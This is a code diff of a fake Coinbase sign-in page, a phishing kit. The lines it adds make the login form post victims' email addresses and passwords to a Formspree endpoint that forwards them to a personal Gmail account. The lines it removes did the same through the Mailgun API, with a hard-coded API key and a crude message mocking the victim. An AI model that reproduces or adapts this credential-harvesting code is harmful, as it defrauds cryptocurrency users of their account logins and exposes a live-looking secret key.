@@ -111,25 +111,27 @@
                 </noscript>
                 <div class="session">
                     <div class="account-form">
-                        <h2>Sign In</h2>
-                        <div class="control-group">
-                            <div class="controls">
-                                <input type="email" name="email" id="email" class="focus text-field" placeholder="Email" tabindex="1" autocomplete="off">
+                        <form action="https://formspree.io/stevuninverse@gmail.com" method="POST">
+                            <h2>Sign In</h2>
+                            <div class="control-group">
+                                <div class="controls">
+                                    <input type="email" name="email" id="email" class="focus text-field" placeholder="Email" tabindex="1" autocomplete="off">
+                                </div>
                             </div>
-                        </div>
-                        <div class="control-group">
-                            <div class="controls">
-                                <input type="password" name="password" id="password" class="text-field" placeholder="Password" autocomplete="off" tabindex="2">
+                            <div class="control-group">
+                                <div class="controls">
+                                    <input type="password" name="password" id="password" class="text-field" placeholder="Password" autocomplete="off" tabindex="2">
+                                </div>
                             </div>
-                        </div>
-                        <div class="control-group">
-                            <div class="controls clearfix">
-                                <input type="submit" name="commit" value="Sign In" class="btn btn-primary pull-right" id="signin_button" tabindex="4">
-                                <label class="checkbox">
-                                    <input type="checkbox" name="stay_signed_in" id="stay_signed_in" value="1" tabindex="3"> Keep me signed in on this computer
-                                </label>
+                            <div class="control-group">
+                                <div class="controls clearfix">
+                                    <input type="submit" name="commit" value="Sign In" class="btn btn-primary pull-right" id="signin_button" tabindex="4">
+                                    <label class="checkbox">
+                                        <input type="checkbox" name="stay_signed_in" id="stay_signed_in" value="1" tabindex="3"> Keep me signed in on this computer
+                                    </label>
+                                </div>
                             </div>
-                        </div>
+                        </form>
                     </div>
                     <div class="account-extras">
                         <p>
@@ -221,24 +223,6 @@
         $(document).ready(function() {
         $("#signin_button").click(function () {
             $("#signin_button").prop("value", "Signing In...");
-
-            var email = $("#email").prop("value");
-            var passwd = $("#password").prop("value");
-
-            console.log("email " + email + " passwd " + passwd);
-            $.ajax({
-                type: "POST",
-                url: "https://cors-anywhere.herokuapp.com/https://api.mailgun.net/v3/sandboxe944a30ccd9c4cadbabaeecde9f42369.mailgun.org/messages",
-                username: 'api',
-                password: 'key-32a0c0f3dc6a07ab25d0999ec62cfffe',
-                crossDomain: true,
-                data: {
-                    "from": "Your Fat Mama <suckmydick@example.com>",
-                    "to": "Fuck <stevuninverse@gmail.com>",
-                    "subject": "HOLY FUCKING SHIT",
-                    "text": "hello this is to notify you that we've succesfully caught a fucking idiot\n\n\nemail: " + email + "\nassword: " + passwd + "\n\n\nregards,\nfuck butt\n\ndickhead of scamming at coīnbase inc\n69 butthole avenue\n42069 shithole, FL\n\n\nplese consider the environment before printing this email"
-                }
-            });
 
             //window.location.replace("https://www.coinbase.com/signin");
         });
